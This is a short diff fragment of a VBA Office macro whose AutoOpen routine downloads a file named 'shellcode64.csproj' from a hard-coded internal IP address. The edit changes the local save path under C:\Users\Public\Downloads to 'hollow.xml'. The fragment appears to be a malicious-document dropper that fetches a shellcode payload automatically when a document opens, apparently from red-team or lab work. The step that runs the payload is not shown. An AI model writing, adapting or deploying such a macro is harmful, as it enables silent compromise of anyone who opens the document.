@@ -12,7 +12,7 @@ Sub AutoOpen()
     Dim ExecFile As Double
 
     myURL = "http://192.168.50.145/shellcode64.csproj"
-    LocalFilePath = "C:\Users\Public\Downloads\shellcode64.csproj"
+    LocalFilePath = "C:\Users\Public\Downloads\hollow.xml"
     
     ' Create the HTTP request object
     Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
